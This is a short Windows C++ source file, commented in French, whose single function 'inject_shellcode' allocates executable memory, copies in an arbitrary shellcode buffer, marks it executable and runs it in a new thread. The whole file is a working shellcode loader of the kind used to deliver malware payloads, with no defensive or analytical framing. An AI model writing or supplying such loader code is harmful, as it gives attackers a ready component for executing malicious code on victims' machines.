#include "memory_handler.h"
#include <windows.h>
#include <iostream>

// Fonction pour injecter et exécuter le shellcode dans le processus courant
bool inject_shellcode(char* shellcode, size_t size) {
    // Allouer de la mémoire avec les permissions PAGE_EXECUTE_READWRITE
    void* execMem = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "Erreur d'allocation de mémoire" << std::endl;
        return false;
    }

    // Copier le shellcode dans la mémoire allouée
    unsigned char* pDest = static_cast<unsigned char*>(execMem);
    unsigned char* pSrc = reinterpret_cast<unsigned char*>(shellcode);

    // Copier les données octet par octet
    for (size_t i = 0; i < size; ++i) {
        pDest[i] = pSrc[i]; // Copie manuelle de chaque octet
    }

    // Changer les permissions de la mémoire pour seulement la rendre exécutable
    DWORD oldProtect;
    if (VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect) == 0) {
        std::cerr << "Erreur de modification des protections de mémoire" << std::endl;
        VirtualFree(execMem, 0, MEM_RELEASE);
        return false;
    }

    // Créer un thread pour exécuter le shellcode
    DWORD threadId;
    HANDLE threadHandle = CreateThread(
        nullptr,       // Security attributes
        0,             // Stack size
        reinterpret_cast<LPTHREAD_START_ROUTINE>(execMem), // Function to execute (the shellcode)
        nullptr,       // Parameter to the thread function
        0,             // Creation flags
        &threadId      // Thread ID
    );

    if (threadHandle == nullptr) {
        std::cerr << "Erreur lors de la création du thread" << std::endl;
        VirtualFree(execMem, 0, MEM_RELEASE);
        return false;
    }

    // Attendre que le thread termine son exécution
    WaitForSingleObject(threadHandle, INFINITE);

    // Libérer la mémoire après exécution
    VirtualFree(execMem, 0, MEM_RELEASE);
    CloseHandle(threadHandle);

    return true;
}
